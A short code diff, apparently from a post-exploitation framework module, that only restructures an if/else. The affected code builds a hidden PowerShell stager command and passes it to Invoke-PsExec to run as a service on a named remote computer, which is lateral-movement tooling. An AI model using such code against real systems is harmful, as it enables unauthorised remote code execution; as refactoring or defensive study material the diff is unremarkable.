@@ -64,12 +64,12 @@ class Module:
 
             if launcher == "":
                 return handle_error_message("[!] Error in launcher generation.")
-            else:
-                stager_cmd = (
-                    "%COMSPEC% /C start /b C:\\Windows\\System32\\WindowsPowershell\\v1.0\\"
-                    + launcher
-                )
-                script_end += f'Invoke-PsExec -ComputerName {computer_name} -ServiceName "{service_name}" -Command "{stager_cmd}"'
+
+            stager_cmd = (
+                "%COMSPEC% /C start /b C:\\Windows\\System32\\WindowsPowershell\\v1.0\\"
+                + launcher
+            )
+            script_end += f'Invoke-PsExec -ComputerName {computer_name} -ServiceName "{service_name}" -Command "{stager_cmd}"'
 
         outputf = params.get("OutputFunction", "Out-String")
         script_end += (
